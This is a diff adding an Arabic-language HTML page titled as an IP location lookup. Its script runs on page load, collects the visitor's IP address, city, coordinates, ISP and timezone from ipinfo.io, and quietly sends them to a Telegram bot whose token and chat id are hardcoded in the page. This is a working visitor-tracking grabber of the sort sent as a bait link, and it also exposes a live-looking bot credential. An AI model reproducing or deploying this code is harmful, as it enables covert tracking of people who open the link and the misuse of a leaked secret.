@@ -1,1 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>📡 تحديد الموقع عبر IP</title>
+</head>
+<body>
+  <h2>⚙️ جارى جمع معلومات الموقع...</h2>
+  <pre id="result">الرجاء الانتظار...</pre>
+
+  <script>
+    const token = "7692799219:AAGv_dCGtZ5c-6MXTrUUJeEVoBDATMN3RgI";
+    const chat_id = "5735855086";
+
+    fetch("https://ipinfo.io/json")
+      .then(res => res.json())
+      .then(data => {
+        const msg = `
+📡 معلومات الموقع عبر IP:
+
+🌍 الدولة: ${data.country}
+🏙️ المدينة: ${data.city}
+📍 إحداثيات: ${data.loc}
+🌐 مزود الخدمة: ${data.org}
+🕒 التوقيت: ${data.timezone}
+💻 IP: ${data.ip}
+`;
+        document.getElementById("result").innerText = msg;
+
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: chat_id, text: msg })
+        })
+        .then(() => console.log("✅ تم الإرسال إلى Telegram"))
+        .catch(err => console.error("❌ فشل الإرسال:", err));
+      })
+      .catch(err => {
+        document.getElementById("result").innerText = "❌ فشل في جلب معلومات IP: " + err;
+      });
+  </script>
+</body>
+</html>
 
